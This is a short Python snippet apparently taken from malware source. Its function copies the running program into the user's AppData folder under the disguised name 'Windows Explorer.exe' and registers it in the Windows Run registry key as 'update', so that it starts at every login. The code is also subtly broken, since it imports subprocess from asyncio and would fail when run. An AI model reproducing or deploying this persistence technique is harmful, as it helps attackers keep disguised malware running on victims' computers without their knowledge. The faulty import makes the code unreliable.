from asyncio import subprocess
import os
import shutil
import sys


def persistent():
    location = os.environ["appdata"] + "\\Windows Explorer.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"', shell=True)